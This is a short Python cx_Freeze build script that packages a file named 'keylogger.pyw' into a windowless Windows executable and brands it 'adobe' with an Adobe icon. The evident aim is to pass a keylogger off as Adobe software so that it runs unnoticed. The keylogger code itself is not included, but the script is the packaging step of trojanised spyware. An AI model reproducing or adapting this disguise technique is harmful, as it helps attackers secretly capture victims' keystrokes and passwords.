from cx_Freeze import setup, Executable

setup(name='adobe',
      version='0.1',
      description='...',
      executables=[Executable('keylogger.pyw', 
                              base='Win32GUI',
                              icon='adobe.ico')])
